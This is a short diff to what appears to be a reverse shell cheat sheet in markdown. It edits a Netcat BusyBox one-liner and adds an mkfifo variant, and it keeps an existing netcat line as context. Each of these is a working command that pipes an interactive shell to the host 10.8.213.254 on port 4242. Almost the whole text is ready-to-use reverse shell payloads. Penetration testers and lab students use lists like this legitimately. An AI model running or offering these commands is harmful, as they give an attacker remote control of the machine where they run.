@@ -362,7 +362,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.213.254 4242 >/tmp/f
 ### Netcat BusyBox
 
 ```bash
-rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.213.254 4242 >/tmp/f
+rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.213.254 4242 >/tmp/f
+```
+
+### mkfifo
+
+```bash
+mkfifo /tmp/pukj; nc 10.8.213.254 4242 0</tmp/pukj | /bin/bash >/tmp/pukj 2>&1; rm /tmp/pukj
 ```
 
 ### Ncat
